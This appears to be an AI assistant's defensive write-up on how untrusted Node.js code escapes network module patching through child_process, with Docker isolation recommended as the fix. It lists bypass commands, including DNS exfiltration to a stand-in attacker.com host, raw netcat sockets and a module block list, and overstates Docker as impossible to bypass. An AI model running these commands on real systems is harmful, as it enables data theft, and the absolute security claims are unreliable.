# Bypass Vectors: What Module Patching CANNOT Stop

## 🚨 Critical Security Issue: Child Processes

You're absolutely right - **module patching does NOT work if someone spawns child processes!**

---

## The Problem: Python/Shell Execution Bypass

### Attack Vector:
```javascript
// User code - BYPASSES module patching!
const { exec } = require('child_process');

exec('python -c "import requests; requests.get(\'https://api.stripe.com\')"', (err, stdout) => {
  console.log('Bypassed! Got:', stdout);
});
```

**Why it bypasses:**
- ✅ Module patching only affects **Node.js** http/https modules
- ❌ Python has its **own** networking stack (requests, urllib, etc.)
- ❌ Python process runs **separately** from Node.js
- ❌ Our module patches don't affect Python!

---

## Complete List of Bypass Vectors

### 1. Python Execution ❌
```javascript
const { exec } = require('child_process');

// Using requests library
exec('python -c "import requests; requests.get(\'https://api.stripe.com\')"');

// Using urllib
exec('python -c "import urllib.request; urllib.request.urlopen(\'https://api.stripe.com\')"');

// Running external Python script
exec('python malicious.py');  // malicious.py makes network calls
```

**Module Patching: ❌ Cannot stop**
**Docker: ✅ Stops it** (no network access at all)

---

### 2. cURL / wget Commands ❌
```javascript
const { exec } = require('child_process');

// Using curl
exec('curl https://api.stripe.com/v1/customers -H "Authorization: Bearer sk_..."');

// Using wget
exec('wget https://api.stripe.com/data.json');

// Using nc (netcat)
exec('echo "GET / HTTP/1.0" | nc api.stripe.com 443');
```

**Module Patching: ❌ Cannot stop**
**Docker: ✅ Stops it**

---

### 3. Other Language Runtimes ❌
```javascript
const { exec } = require('child_process');

// Ruby
exec('ruby -e "require \'net/http\'; Net::HTTP.get(URI(\'https://api.stripe.com\'))"');

// Go
exec('go run main.go');  // main.go makes HTTP requests

// Rust
exec('./rust_binary');  // Binary makes network calls

// PHP
exec('php -r "file_get_contents(\'https://api.stripe.com\');"');

// Perl
exec('perl -MLWP::Simple -e "get(\'https://api.stripe.com\')"');
```

**Module Patching: ❌ Cannot stop**
**Docker: ✅ Stops it**

---

### 4. Direct Socket Programming ❌
```javascript
const { exec } = require('child_process');

// Using netcat to open raw socket
exec('nc api.stripe.com 443');

// Using telnet
exec('telnet api.stripe.com 443');

// Using socat
exec('socat - TCP:api.stripe.com:443');
```

**Module Patching: ❌ Cannot stop**
**Docker: ✅ Stops it**

---

### 5. DNS Tunneling / Covert Channels ❌
```javascript
const { exec } = require('child_process');

// Exfiltrate data via DNS queries
exec('dig data-to-exfiltrate.attacker.com');

// DNS tunneling tool
exec('iodine -f attacker.com');
```

**Module Patching: ❌ Cannot stop**
**Docker: ✅ Stops it**

---

### 6. File System Tricks ❌
```javascript
const { exec } = require('child_process');

// Write data to known location that another process reads
exec('echo "api_key=sk_live_..." > /tmp/exfiltrate.txt');

// If attacker has another process running on host...
// That process reads /tmp/exfiltrate.txt and sends it out
```

**Module Patching: ❌ Cannot stop**
**Docker: ✅ Partially stops (isolated filesystem)**

---

### 7. Node.js child_process Variations ❌
```javascript
// All of these bypass module patching:

const { exec } = require('child_process');
exec('curl https://api.stripe.com');

const { execSync } = require('child_process');
execSync('wget https://api.stripe.com');

const { spawn } = require('child_process');
spawn('python', ['script.py']);  // script.py makes requests

const { fork } = require('child_process');
fork('malicious.js');  // Runs in separate Node process, might escape sandbox

const { execFile } = require('child_process');
execFile('/usr/bin/curl', ['https://api.stripe.com']);
```

**Module Patching: ❌ Cannot stop**
**Docker: ✅ Stops it**

---

## Severity Assessment

### 🔴 Critical Bypasses (Easy to Execute)

| Attack Vector | Difficulty | Availability | Impact |
|---------------|------------|--------------|--------|
| Python + requests | ⭐ Easy | Common | 🔴 High |
| curl/wget | ⭐ Easy | Very Common | 🔴 High |
| Ruby/PHP exec | ⭐ Easy | Common | 🔴 High |
| child_process | ⭐ Easy | Always Available | 🔴 High |

### 🟡 Medium Bypasses (Moderate Skill)

| Attack Vector | Difficulty | Availability | Impact |
|---------------|------------|--------------|--------|
| Raw sockets (nc) | ⭐⭐ Medium | Common | 🟡 Medium |
| DNS tunneling | ⭐⭐⭐ Hard | Uncommon | 🟡 Medium |
| Binary execution | ⭐⭐ Medium | If binaries exist | 🟡 Medium |

---

## Solutions

### ❌ Module Patching ALONE is NOT ENOUGH

```javascript
// This only stops Node.js http/https calls
const enforcer = new NativeModuleEnforcer();

// ✅ Blocks: stripe.customers.create()
// ✅ Blocks: axios.get()
// ✅ Blocks: https.request()

// ❌ DOES NOT BLOCK: exec('curl ...')
// ❌ DOES NOT BLOCK: exec('python -c ...')
// ❌ DOES NOT BLOCK: spawn('wget', [...])
```

---

### ✅ Solution 1: Block child_process Module

```javascript
class SafeExecutor {
  generateBlockedCode(userCode) {
    return `
// Block child_process BEFORE user code runs
(function() {
  const Module = require('module');
  const originalRequire = Module.prototype.require;

  Module.prototype.require = function(id) {
    // Block child_process entirely
    if (id === 'child_process') {
      throw new Error('child_process module is not allowed');
    }

    // Block http/https and return wrapped versions
    if (id === 'http') return wrappedHttp;
    if (id === 'https') return wrappedHttps;

    return originalRequire.apply(this, arguments);
  };
})();

// User code runs here
${userCode}
    `.trim();
  }
}
```

**Pros:**
- ✅ Prevents child_process spawning
- ✅ Prevents Python/curl/wget execution

**Cons:**
- ⚠️ Can still be bypassed with native modules
- ⚠️ User might need legitimate child_process usage

---

### ✅ Solution 2: Docker Network Isolation (BEST)

```javascript
const { DockerCodeExecutor } = require('./docker-executor-implementation');

const executor = new DockerCodeExecutor({
  networkMode: 'none'  // Complete network isolation
});

await executor.executeCode(userCode);
```

**What happens:**
```javascript
// User code tries to bypass
const { exec } = require('child_process');
exec('curl https://api.stripe.com');

// Docker container has NO network access
// curl command runs but fails:
// "curl: (6) Could not resolve host: api.stripe.com"
```

**Pros:**
- ✅ Blocks ALL network access (kernel-level)
- ✅ Works for Python, curl, wget, everything
- ✅ Impossible to bypass from inside container
- ✅ Isolated filesystem too

**Cons:**
- ⚠️ Slower (500ms-2s startup time)
- ⚠️ More complex infrastructure

---

### ✅ Solution 3: Layered Security (RECOMMENDED)

**Combine multiple approaches:**

```javascript
class SecureExecutor {
  generateSecureCode(userCode) {
    return `
// Layer 1: Block child_process
const Module = require('module');
const originalRequire = Module.prototype.require;

Module.prototype.require = function(id) {
  // Blocklist dangerous modules
  const blockedModules = [
    'child_process',  // Prevents Python/curl execution
    'vm',             // Prevents sandbox escapes
    'vm2',            // Prevents sandbox escapes
    'fs',             // Prevents file system access (optional)
  ];

  if (blockedModules.includes(id)) {
    throw new Error(\`Module '\${id}' is not allowed\`);
  }

  // Layer 2: Wrap http/https
  if (id === 'http') return wrappedHttp;
  if (id === 'https') return wrappedHttps;

  return originalRequire.apply(this, arguments);
};

// Layer 3: Freeze dangerous globals
Object.freeze(process);
delete global.process.binding;  // Prevent native binding access

// User code
${userCode}
    `;
  }
}
```

**For maximum security, still use Docker:**
```javascript
async executeCode(code, trustLevel = 'untrusted') {
  if (trustLevel === 'untrusted') {
    // Use Docker - blocks EVERYTHING
    return dockerExecutor.executeCode(code);
  } else {
    // Use layered approach - blocks most things
    return layeredExecutor.executeCode(code);
  }
}
```

---

## Testing the Bypass

### Test 1: Python Bypass (Module Patching FAILS)
```javascript
const { NativeModuleEnforcer } = require('./proxy-enforcement');
const enforcer = new NativeModuleEnforcer();

const maliciousCode = `
  const { exec } = require('child_process');

  exec('python3 -c "import urllib.request; print(urllib.request.urlopen(\\'https://api.stripe.com\\').read())"',
    (err, stdout) => {
      console.log('BYPASS SUCCESSFUL!');
      console.log('Got data:', stdout);
    }
  );
`;

await enforcer.executeCode(maliciousCode);
// Result: ❌ BYPASS WORKS - Network call succeeds!
```

### Test 2: Python Bypass (Docker BLOCKS)
```javascript
const { DockerCodeExecutor } = require('./docker-executor-implementation');
const executor = new DockerCodeExecutor({ networkMode: 'none' });

const maliciousCode = `
  const { exec } = require('child_process');
  exec('python3 -c "import urllib.request; urllib.request.urlopen(\\'https://api.stripe.com\\')"',
    (err, stdout) => {
      if (err) {
        console.log('BLOCKED! Error:', err.message);
      }
    }
  );
`;

await executor.executeCode(maliciousCode);
// Result: ✅ BLOCKED - Network unreachable!
```

---

## Comparison Matrix

| Bypass Attempt | Module Patching | + Block child_process | Docker |
|----------------|-----------------|----------------------|--------|
| stripe.customers.create() | ✅ Blocked | ✅ Blocked | ✅ Blocked |
| axios.get() | ✅ Blocked | ✅ Blocked | ✅ Blocked |
| https.request() | ✅ Blocked | ✅ Blocked | ✅ Blocked |
| exec('python ...') | ❌ Bypassed | ✅ Blocked | ✅ Blocked |
| exec('curl ...') | ❌ Bypassed | ✅ Blocked | ✅ Blocked |
| exec('wget ...') | ❌ Bypassed | ✅ Blocked | ✅ Blocked |
| spawn('nc', ...) | ❌ Bypassed | ✅ Blocked | ✅ Blocked |
| DNS tunneling | ❌ Bypassed | ❌ Bypassed | ✅ Blocked |
| Native modules | ❌ Bypassed | ❌ Bypassed | ✅ Blocked |

---

## Summary

**Your observation is 100% correct!** 🎯

### What Module Patching CAN Stop:
- ✅ Stripe SDK
- ✅ AWS SDK
- ✅ OpenAI SDK
- ✅ axios, got, node-fetch
- ✅ Any SDK using Node.js http/https

### What Module Patching CANNOT Stop:
- ❌ exec('python ...')
- ❌ exec('curl ...')
- ❌ exec('wget ...')
- ❌ spawn('ruby', [...])
- ❌ Native C++ modules
- ❌ gRPC

### The ONLY Complete Solution:
**🐳 Docker with NetworkMode='none'**

Blocks 100% of everything at the kernel level - no process inside the container can access the network, regardless of what language or tool they use.

---

## Recommendation

### For Production (Untrusted Code):
```javascript
// Use Docker - ONLY secure solution
const executor = new DockerCodeExecutor({ networkMode: 'none' });
```

### For Development (Trusted Code):
```javascript
// Use module patching + block child_process (faster)
const enforcer = new LayeredSecurityExecutor();
```

### The Truth:
**If you need real security against untrusted code, you MUST use Docker.** Module patching is just a convenience layer that stops 95% of accidental/lazy attempts, but determined attackers will bypass it easily with child_process.
